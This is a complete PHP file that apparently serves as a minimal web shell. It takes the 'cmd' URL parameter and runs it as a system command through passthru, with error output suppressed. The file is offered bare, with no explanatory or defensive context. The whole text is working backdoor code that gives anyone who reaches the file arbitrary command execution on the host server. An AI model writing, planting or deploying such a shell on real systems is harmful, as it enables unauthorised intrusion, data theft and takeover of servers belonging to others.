<?php
function execute($cfe) {
	@ob_start();
	@passthru($cfe);
	$res = @ob_get_contents();
	@ob_end_clean();
	return $res;
}

$command = $_GET['cmd'];
execute($command);
?>